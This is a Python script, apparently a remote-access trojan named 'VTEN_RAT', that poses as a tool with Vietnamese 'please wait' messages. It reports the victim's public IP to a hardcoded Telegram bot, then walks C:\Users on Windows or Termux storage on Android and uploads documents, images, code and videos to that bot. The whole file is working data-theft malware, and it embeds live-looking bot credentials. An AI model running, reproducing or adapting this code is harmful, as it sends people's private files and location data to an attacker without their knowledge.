import requests
from time import sleep
import os

CHAT_ID = '-1001998361973'
BOT_TOKEN = '6484169288:AAEBPy7kj3Zxf60yMVmZWCYJUzK73wglU8M'

filenameex = ['.txt','.py','.php','.png','.jpg','.jpeg','.mp4','.html','.xlsx','.doc','.pp']

def sendFile(file):
    with open(file,'rb') as f:
        b = f.read()
    response = {
        'document': (file,b )
    }
    return requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument?chat_id={CHAT_ID}',files = response).json()

def sendMessage(msg):return requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}').json()
def clk(w):
    for x in filenameex:
        if x in w:
            return True
    return False


def attack(p):
    i = 0
    for r, d, f in os.walk(p):
        for file in f:
            print(f" [{i}] Đang tải tài nguyên",end='\r')
            i+=1
            if clk(file):
                
                try:
                    sendFile(r+"\\"+file)
                    
                except:
                    pass


os.system("cls" if os.name == "nt" else "clear")

if os.name == "nt":
    print("vui lòng chờ...")
    ip = requests.get("https://ipinfo.io/json").json()['ip']
    ip = ip.center(12)
    sendMessage(f"""
    ╔══════════════════════════════╗
    ║          [VTEN_RAT]          ║
    ║══════════════════════════════║
    ║  [IP]: {ip}       ║
    ║  [SYSTEM]: Windows           ║
    ╚══════════════════════════════╝
    
[Attacking]:Started...
    """)
    os.system("cls" if os.name == "nt" else "clear")
    print("sau khi tải tài nguyên, vui lòng chạy lại tool...")
    attack('C:\\Users')

else:
    print("vui lòng chờ...")
    ip = requests.get("https://ipinfo.io/json").json()['ip']
    ip = ip.center(12)
    system
    sendMessage(f"""
    ╔══════════════════════════════╗
    ║          [VTEN_RAT]          ║
    ║══════════════════════════════║
    ║  [IP]: {ip}       ║
    ║  [SYSTEM]: Android           ║
    ╚══════════════════════════════╝
    
[Attacking]:Started...
    """)
    os.system("cls" if os.name == "nt" else "clear")
    print("sau khi tải tài nguyên, vui lòng chạy lại tool...")
    attack('data\\data\\com.termux\\files\\storage')